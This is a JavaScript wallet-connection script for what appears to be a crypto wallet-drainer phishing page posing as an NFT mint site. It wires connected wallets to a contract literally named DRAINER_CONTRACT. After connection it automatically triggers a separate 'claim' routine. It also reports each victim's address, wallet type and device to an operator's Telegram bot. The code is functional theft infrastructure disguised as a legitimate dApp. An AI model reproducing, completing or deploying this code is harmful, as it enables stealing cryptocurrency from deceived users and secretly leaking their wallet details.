// main.js — Wallet connection orchestrator
// Coordinates WalletConnect v2 + injected EIP-1193 providers for all devices.
// Single source of truth: `state` object. localStorage is only a mirror.

import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const WC_CHAINS = [MAINNET_ID];
  const WC_METHODS = [
    'eth_sendTransaction',
    'personal_sign',
    'eth_sign',
    'eth_signTypedData_v4',
  ];
  const WC_EVENTS = ['chainChanged', 'accountsChanged'];

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobile  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOS     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroid = /Android/i.test(UA);
  const isDesktop = !isMobile;

  const getPlatform = () => {
    if (isIOS) return 'ios';
    if (isAndroid) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  DEBUG PANEL (double-click anywhere to toggle)
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 6px;
    z-index: 10000; max-height: 160px; overflow-y: auto;
    display: none; font-family: monospace; line-height: 1.4;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function log(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA)) return { wallet: 'trust', name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA)) return { wallet: 'rainbow', name: 'Rainbow' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function notifyTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => notifyTelegram(m || `🧪 Test ${new Date().toISOString()}`);

  // ==========================================================================
  //  LIBRARY LOADING (with CDN fallback + timeout)
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
      ),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 10000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        log(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        log(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, WalletConnectModal, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m, 'WalletConnectModal'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m, 'Web3'),
    ]);

    return {
      EthereumProvider,
      WalletConnectModal,
      Web3: Web3Mod.default || Web3Mod,
    };
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE (single source of truth)
  // ==========================================================================
  const state = {
    EthereumProvider: null,   // class
    WalletConnectModal: null, // class
    Web3: null,               // class

    wcProvider: null,         // EthereumProvider instance (owned by us)
    wcInitPromise: null,      // memoized init promise
    injected: null,           // EIP-1193 injected provider
    active: null,             // live provider (wc or injected)
    mode: null,               // 'walletconnect' | 'injected' | null

    web3: null,
    contract: null,
    address: null,
    chainId: null,

    isConnecting: false,
    isDisconnecting: false,
    libsReady: false,

    wcEventsAttached: false,
    injectedEventsAttached: false,
  };

  // ==========================================================================
  //  UI HELPERS
  // ==========================================================================
  function setButtonState(button, kind) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = kind === 'loading';
    button.style.cursor = kind === 'loading' ? 'not-allowed' : 'pointer';

    const variants = {
      normal: {
        bg: 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)',
        html: '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint',
      },
      loading: {
        bg: 'linear-gradient(135deg, #666666 0%, #888888 100%)',
        html: '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...',
      },
      connected: {
        bg: 'linear-gradient(135deg, #10B981 0%, #059669 100%)',
        html: '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected',
      },
      disconnect: {
        bg: 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)',
        html: '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect',
      },
      failed: {
        bg: 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)',
        html: '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed',
      },
    };
    const v = variants[kind] || variants.normal;
    button.style.background = v.bg;
    button.innerHTML = v.html;

    if (kind === 'failed') {
      setTimeout(() => {
        if (!state.active) setButtonState(button, 'normal');
      }, 2500);
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';

    const palette = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, palette[type] || palette.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE (mirror only)
  // ==========================================================================
  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
  const persist = (address, mode) => {
    try {
      localStorage.setItem(LS.addr, address);
      localStorage.setItem(LS.mode, mode);
    } catch {}
  };
  const readSaved = () => ({
    address: localStorage.getItem(LS.addr),
    mode: localStorage.getItem(LS.mode),
  });
  const clearSaved = () => {
    try {
      localStorage.removeItem(LS.addr);
      localStorage.removeItem(LS.mode);
    } catch {}
  };

  // ==========================================================================
  //  PUBLISH GLOBAL STATE (script.js consumes this)
  // ==========================================================================
  function publish() {
    if (!state.address) {
      window.__apexConnected = null;
      return;
    }
    window.__apexConnected = {
      address: state.address,
      chain: 'evm',
      web3: state.web3,
      contract: state.contract,
      provider: state.active,
      mode: state.mode,
      publishedAt: Date.now(),
    };
    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address: state.address, chain: 'evm', mode: state.mode },
    }));
    log(`publish: ${state.address} mode=${state.mode}`);
  }

  // ==========================================================================
  //  ATTACH WEB3 + CONTRACT
  // ==========================================================================
  function attachWeb3(provider) {
    state.web3 = new state.Web3(provider);
    state.contract = new state.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    return state.web3;
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function renderConnectedUI() {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      (connectButton?.parentNode || document.body).appendChild(display);
    }

    const short = `${state.address.slice(0, 6)}...${state.address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">◆ ETH</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(state.address).then(() => {
        const b = document.getElementById('copyAddress');
        if (!b) return;
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 1800);
      }).catch(() => {});
    });

    showStatus('Wallet connected', 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  const eip6963Providers = [];
  let eip6963Init = false;

  function setupEIP6963() {
    if (eip6963Init) return;
    eip6963Init = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!d?.info?.uuid) return;
      if (!eip6963Providers.some((p) => p.info.uuid === d.info.uuid)) {
        eip6963Providers.push(d);
        log(`EIP-6963: ${d.info.name}`);
      }
    });
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 400);
    setTimeout(request, 1200);
  }

  function showProviderPicker(providers) {
    return new Promise((resolve) => {
      const overlay = document.createElement('div');
      overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.72);display:flex;align-items:center;justify-content:center;z-index:99999;`;
      const box = document.createElement('div');
      box.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:420px;width:92%;color:white;font-family:Inter,system-ui,sans-serif;`;
      box.innerHTML = `
        <h3 style="margin:0 0 4px;font-weight:600;font-size:20px;">Select a Wallet</h3>
        <p style="margin:0 0 16px;color:#9CA3AF;font-size:13px;">Choose how you'd like to connect.</p>
        <div id="wl" style="display:flex;flex-direction:column;gap:10px;"></div>
        <button id="cw" style="margin-top:16px;background:none;border:1px solid #4B5563;color:#D1D5DB;padding:10px 16px;border-radius:8px;cursor:pointer;width:100%;">Cancel</button>
      `;
      overlay.appendChild(box);
      document.body.appendChild(overlay);

      const list = box.querySelector('#wl');
      providers.forEach((p) => {
        const b = document.createElement('button');
        b.style.cssText = `background:#374151;border:none;padding:12px 14px;border-radius:10px;color:white;font-size:15px;cursor:pointer;text-align:left;display:flex;gap:12px;align-items:center;transition:background .15s;`;
        b.onmouseenter = () => (b.style.background = '#4B5563');
        b.onmouseleave = () => (b.style.background = '#374151');
        if (p.info.icon) {
          const i = document.createElement('img');
          i.src = p.info.icon;
          i.style.cssText = 'width:24px;height:24px;border-radius:4px;';
          b.appendChild(i);
        }
        const label = document.createElement('span');
        label.textContent = p.info.name;
        b.appendChild(label);
        b.onclick = () => { overlay.remove(); resolve(p); };
        list.appendChild(b);
      });
      box.querySelector('#cw').onclick = () => { overlay.remove(); resolve(null); };
    });
  }

  // ==========================================================================
  //  WALLETCONNECT — INIT (memoized)
  // ==========================================================================
  async function getWCProvider(useFallback = false) {
    if (state.wcProvider) return state.wcProvider;
    if (state.wcInitPromise) return state.wcInitPromise;

    state.wcInitPromise = (async () => {
      const projectId = useFallback ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
      if (!projectId) {
        log('❌ No WalletConnect projectId');
        return null;
      }
      if (!state.EthereumProvider) {
        log('❌ EthereumProvider class not loaded');
        return null;
      }

      try {
        log(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
        const t0 = performance.now();

        const opts = {
          projectId,
          chains: WC_CHAINS,
          optionalChains: WC_CHAINS,
          showQrModal: false,
          methods: WC_METHODS,
          events: WC_EVENTS,
          metadata: DAPP_METADATA,
        };

        const provider = await withTimeout(
          state.EthereumProvider.init(opts),
          15000,
          'EthereumProvider.init'
        );

        state.wcProvider = provider;
        attachWCEvents(provider);
        log(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
        return provider;
      } catch (e) {
        log(`❌ WC init failed: ${e.message}`);
        state.wcProvider = null;
        return null;
      } finally {
        state.wcInitPromise = null;
      }
    })();

    return state.wcInitPromise;
  }

  // ==========================================================================
  //  WALLETCONNECT — EVENT WIRING (once per provider)
  // ==========================================================================
  function attachWCEvents(provider) {
    if (!provider || state.wcEventsAttached) return;
    state.wcEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      log(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts?.length) {
        teardown({ skipWalletCall: true });
        return;
      }
      state.address = accounts[0];
      persist(state.address, 'walletconnect');
      renderConnectedUI();
      publish();
      scheduleClaim();
    });

    provider.on('chainChanged', (id) => {
      log(`WC chainChanged: ${id}`);
      state.chainId = Number(id);
      if (state.address && state.active) {
        attachWeb3(state.active);
        publish();
      }
      showStatus(`Network changed to ${id}`, 'info');
    });

    provider.on('disconnect', (reason) => {
      log(`WC disconnect: ${reason}`);
      teardown({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      log('WC session_delete');
      teardown({ skipWalletCall: true });
    });
  }

  // ==========================================================================
  //  INJECTED — EVENT WIRING
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider?.on || state.injectedEventsAttached) return;
    state.injectedEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        teardown({ skipWalletCall: true });
        return;
      }
      state.address = accounts[0];
      persist(state.address, 'injected');
      renderConnectedUI();
      publish();
      scheduleClaim();
    });

    provider.on('chainChanged', (id) => {
      state.chainId = typeof id === 'string' ? parseInt(id, 16) : Number(id);
      if (state.address && state.active) {
        attachWeb3(state.active);
        publish();
      }
      showStatus(`Network changed to ${state.chainId}`, 'info');
    });

    provider.on('disconnect', () => teardown({ skipWalletCall: true }));
  }

  function scheduleClaim() {
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        try { window.initiateClaimProcess(); } catch (e) { log(`claim trigger: ${e.message}`); }
      }
    }, 900);
  }

  // ==========================================================================
  //  INJECTED — CONNECT
  // ==========================================================================
  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 350));

    const inWallet = detectInWalletBrowser();
    let providers = eip6963Providers.filter((p) => p.provider);

    if (!providers.length && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected Wallet', rdns: 'io.injected', uuid: 'injected' },
        provider: window.ethereum,
      }];
    }
    if (!providers.length) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || (await showProviderPicker(providers));
      if (!chosen) return null;
    }

    const provider = chosen.provider;
    try {
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        25000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      state.injected = provider;
      state.active = provider;
      state.mode = 'injected';
      state.address = accounts[0];
      state.chainId = await provider.request({ method: 'eth_chainId' }).then((id) => parseInt(id, 16)).catch(() => MAINNET_ID);

      attachWeb3(provider);
      attachInjectedEvents(provider);
      persist(state.address, 'injected');
      renderConnectedUI();
      publish();

      notifyTelegram(`
🔗 <b>Wallet Connected</b>
📌 <b>Mode:</b> injected (${chosen.info?.name || 'wallet'})
👤 <b>Address:</b> <code>${state.address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile ? 'Yes' : 'No'}
      `.trim());

      log(`✅ injected connected: ${state.address}`);
      return state.address;
    } catch (e) {
      log(`injected error: ${e.message}`);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT — CONNECT
  //
  //  Correct flow:
  //    1. getWCProvider() → EthereumProvider.init() (memoized, one instance)
  //    2. If provider.session exists, the session is already restored — sync UI.
  //    3. Otherwise open our own WalletConnectModal, listen for display_uri,
  //       call provider.enable() which triggers pairing + waits for approval.
  //    4. Close the modal in a finally block — always.
  // ==========================================================================
  async function connectWalletConnect(useFallback = false) {
    const provider = await getWCProvider(useFallback);
    if (!provider) return null;

    // Already approved session restored by SDK?
    if (provider.session) {
      const accounts = provider.accounts;
      if (accounts?.length) {
        state.active = provider;
        state.mode = 'walletconnect';
        state.address = accounts[0];
        state.chainId = MAINNET_ID;
        attachWeb3(provider);
        persist(state.address, 'walletconnect');
        renderConnectedUI();
        publish();
        log(`♻️ WC session reused: ${state.address}`);
        return state.address;
      }
    }

    // Fresh connect — build modal on desktop only (mobile uses deep links).
    let modal = null;
    if (state.WalletConnectModal && isDesktop) {
      try {
        modal = new state.WalletConnectModal({
          projectId: useFallback ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '99999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        });
      } catch (e) {
        log(`modal init: ${e.message}`);
      }
    }

    let modalOpened = false;
    const onDisplayUri = (uri) => {
      if (modalOpened || !uri) return;
      modalOpened = true;
      try { modal?.openModal({ uri }); } catch (e) { log(`openModal: ${e.message}`); }
    };
    provider.on('display_uri', onDisplayUri);

    showStatus('Opening wallet…', 'info');

    try {
      // enable() = pairing + wait for approval. This replaces the legacy
      // client.connect() + client.approval() combo and cannot double-fire.
      const accounts = await provider.enable();

      if (!accounts?.length) {
        log('WC enable returned no accounts');
        return null;
      }

      state.active = provider;
      state.mode = 'walletconnect';
      state.address = accounts[0];
      state.chainId = MAINNET_ID;
      attachWeb3(provider);
      persist(state.address, 'walletconnect');
      renderConnectedUI();
      publish();

      log(`✅ WC connected: ${state.address}`);
      return state.address;
    } catch (e) {
      log(`WC enable error: ${e.message}`);
      if (/rejected|user closed|user rejected/i.test(e.message || '')) {
        log('user rejected WC');
      }
      return null;
    } finally {
      provider.removeListener?.('display_uri', onDisplayUri);
      try { modal?.closeModal(); } catch {}
    }
  }

  // ==========================================================================
  //  TEARDOWN — single, definitive disconnect path
  // ==========================================================================
  async function teardown({ skipWalletCall = false } = {}) {
    if (state.isDisconnecting) return;
    state.isDisconnecting = true;

    const mode = state.mode;
    const wc = state.wcProvider;
    const inj = state.injected;

    try {
      if (!skipWalletCall && mode === 'walletconnect' && wc?.session) {
        try {
          await Promise.race([
            wc.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
        } catch (e) {
          log(`WC disconnect err: ${e.message}`);
        }
      }

      if (mode === 'injected' && inj?.request) {
        // Best-effort permission revoke (MetaMask supports this since v10.28).
        try {
          await inj.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          });
        } catch {}
      }
    } finally {
      // Reset everything — WC provider gets nulled so next connect re-inits fresh.
      state.wcProvider = null;
      state.wcInitPromise = null;
      state.wcEventsAttached = false;
      state.injectedEventsAttached = false;
      state.injected = null;
      state.active = null;
      state.mode = null;
      state.web3 = null;
      state.contract = null;
      state.address = null;
      state.chainId = null;

      clearSaved();
      resetConnectedUI();
      window.__apexConnected = null;

      state.isDisconnecting = false;
      log('🔌 Disconnected');
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connect() {
    if (state.isConnecting || state.isDisconnecting) return;
    state.isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;
    const inWallet = detectInWalletBrowser();
    const preferInjected = !!inWallet && isMobile;

    try {
      if (preferInjected) {
        log(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktop && window.ethereum && eip6963Providers.length > 0) {
        address = await connectInjected();
      }

      if (!address) {
        address = await connectWalletConnect(false);
      }
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        log('↻ retry with fallback projectId');
        address = await connectWalletConnect(true);
      }
    } catch (e) {
      log(`connect exception: ${e.message}`);
    } finally {
      state.isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      scheduleClaim();
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  async function disconnect() {
    showStatus('Disconnecting…', 'info');
    await teardown();
    showStatus('Wallet disconnected', 'info');
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (state.isConnecting || state.isDisconnecting) return;
    const connected = !!state.active || !!state.address;
    if (connected) await disconnect();
    else await connect();
  };

  connectButton?.addEventListener('click', handleClick);
  walletButton?.addEventListener('click', handleClick);

  if (walletButton && isMobile) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE (non-destructive)
  //
  //  WalletConnect's EthereumProvider.init() automatically rehydrates the
  //  previous session from its own storage. We only need to check `.session`.
  // ==========================================================================
  async function restore() {
    const saved = readSaved();
    if (!saved.address) return;

    // WalletConnect restore
    if (!saved.mode || saved.mode === 'walletconnect') {
      try {
        const provider = await getWCProvider(false);
        if (provider?.session && provider.accounts?.length) {
          state.active = provider;
          state.mode = 'walletconnect';
          state.address = provider.accounts[0];
          state.chainId = MAINNET_ID;
          attachWeb3(provider);
          persist(state.address, 'walletconnect');
          renderConnectedUI();
          publish();
          log(`♻️ WC session restored: ${state.address}`);
          return;
        }
      } catch (e) {
        log(`WC restore: ${e.message}`);
      }
    }

    // Injected restore
    if ((!saved.mode || saved.mode === 'injected') && isDesktop && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts?.length && accounts[0].toLowerCase() === saved.address.toLowerCase()) {
          state.injected = window.ethereum;
          state.active = window.ethereum;
          state.mode = 'injected';
          state.address = accounts[0];
          state.chainId = await window.ethereum
            .request({ method: 'eth_chainId' })
            .then((id) => parseInt(id, 16))
            .catch(() => MAINNET_ID);

          attachWeb3(window.ethereum);
          attachInjectedEvents(window.ethereum);
          persist(state.address, 'injected');
          renderConnectedUI();
          publish();
          log(`♻️ injected session restored: ${state.address}`);
          return;
        }
      } catch (e) {
        log(`injected restore: ${e.message}`);
      }
    }

    // Stale — clear so we never show a phantom "connected" state.
    log('⚠️ No restorable session — clearing saved wallet');
    clearSaved();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadLibraries();
    state.EthereumProvider = libs.EthereumProvider;
    state.WalletConnectModal = libs.WalletConnectModal;
    state.Web3 = libs.Web3;
    state.libsReady = true;
    log('✅ libraries ready');

    setupEIP6963();

    // Warm up the WC provider on mobile so first tap is instant.
    if (isMobile) {
      log('📱 pre-warming WC');
      getWCProvider(false).catch(() => {});
    }

    // Let EIP-6963 announce, then attempt restore.
    await new Promise((r) => setTimeout(r, 300));
    await restore();
  } catch (err) {
    log(`Fatal: ${err.message}`);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  log(`✅ main.js ready — platform=${getPlatform()} mobile=${isMobile}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
